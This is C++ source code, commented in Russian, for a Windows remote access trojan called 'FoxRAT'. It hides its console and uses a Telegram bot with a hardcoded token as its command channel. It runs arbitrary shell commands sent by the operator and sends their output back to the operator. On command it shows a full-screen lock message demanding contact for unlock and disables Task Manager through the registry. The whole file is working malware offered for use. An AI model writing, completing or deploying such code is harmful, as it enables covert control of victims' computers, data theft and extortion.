#include <windows.h>
#include <wininet.h>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>

#pragma comment(lib, "wininet.lib")

// --- КОНФИГ ЦЕНТРА ---
const char* BOT_TOKEN = "8508060217:AAH87XK6qzB8NNmfdm3DBiCCEQRv1QxxkP0"; // Токен ТГ бота
const char* CHAT_ID   = "8944641597";            // ID чата куда слать логи и откуда принимать команды
const char* BOT_API   = "api.telegram.org";

// Функция для HTTP GET/POST запросов через WinINet
std::string HttpPostRequest(const std::string& endpoint, const std::string& postData) {
    HINTERNET hInternet = InternetOpenA("FoxRAT/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, BOT_API, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }

    std::string headers = "Content-Type: application/x-www-form-urlencoded";
    HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)postData.c_str(), postData.length());

    std::string response;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        response.append(buffer, bytesRead);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}

// Отправка сообщения в ТГ
void SendTGMessage(const std::string& text) {
    std::string endpoint = "/bot" + std::string(BOT_TOKEN) + "/sendMessage";
    std::string postData = "chat_id=" + std::string(CHAT_ID) + "&text=" + text;
    HttpPostRequest(endpoint, postData);
}

// Получение новых команд
std::string GetTGUpdates() {
    std::string endpoint = "/bot" + std::string(BOT_TOKEN) + "/getUpdates";
    std::string postData = "offset=-1"; // Берем только последнее сообщение
    return HttpPostRequest(endpoint, postData);
}

// RAT: Выполнение команды в cmd
std::string ExecCMD(const std::string& cmd) {
    std::string result = "";
    char buffer[128];
    std::string fullCmd = "C:\\Windows\\System32\\cmd.exe /c " + cmd;
    FILE* pipe = _popen(fullCmd.c_str(), "r");
    if (!pipe) return "[-] CMD exec failed";
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {}
    _pclose(pipe);
    return result;
}

// LOCKER: Окно блокировки поверх всех окон
LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CLOSE:
        case WM_QUIT:
            // Запрещаем закрытие
            return 0;
        case WM_KEYDOWN:
            if (wParam == VK_ESCAPE || (wParam == VK_CONTROL && wParam == VK_SHIFT) || wParam == VK_MENU) {
                return 0; // Блокируем системные комбинации (упрощенно)
            }
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void ShowLocker() {
    // Блокируем ввод от пользователя (мышь, клава) на уровне системы
    // ВНИМАНИЕ: Это вызовет синий экран/отказ при попытке разблокировки без пароля.
    // Для PoC используем просто TopMost окно.
    
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = LockerProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "FoxLocker";
    RegisterClassA(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "FoxLocker", "SYSTEM LOCKED",
        WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh,
        NULL, NULL, wc.hInstance, NULL
    );

    // Блокируем Task Manager
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    DWORD val = 1;
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hKey);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);
    
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, sw, sh, SWP_NOMOVE | SWP_NOSIZE);
    
    // Рисуем надпись через GDI (упрощенно)
    HDC hdc = GetDC(hwnd);
    std::string text = "PC LOCKED BY FOX. CONTACT @ID FOR UNLOCK";
    while(true) {
        PAINTSTRUCT ps;
        BeginPaint(hwnd, &ps);
        SetTextColor(hdc, RGB(255, 0, 0));
        SetBkColor(hdc, RGB(0, 0, 0));
        TextOutA(hdc, sw/2 - 200, sh/2, text.c_str(), text.length());
        EndPaint(hwnd, &ps);
        Sleep(1000); // Заглушка цикла сообщений (упрощенно)
    }
}

// Главная функция C2 (слушалка)
void C2Listener() {
    SendTGMessage("[*] FoxRAT Online. Hostname: " + std::string(getenv("COMPUTERNAME")));
    
    while (true) {
        std::string update = GetTGUpdates();
        
        // Простейший парсер (в реальном боте нужен JSON)
        // Ищем команду в ответе
        if (update.find("\"text\":\"cmd ") != std::string::npos) {
            size_t pos = update.find("\"text\":\"cmd ") + 11;
            size_t end = update.find("\"", pos);
            std::string cmd = update.substr(pos, end - pos);
            std::string out = ExecCMD(cmd);
            SendTGMessage("[CMD OUT]\n" + out);
        } else if (update.find("\"text\":\"lock") != std::string::npos) {
            SendTGMessage("[*] Executing LOCKER...");
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ShowLocker, NULL, 0, NULL);
        }
        
        Sleep(5000); // Опрос каждые 5 секунд
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Скрываем консоль
    FreeConsole();
    
    // Запускаем цикл управления
    C2Listener();
    
    return 0;
}
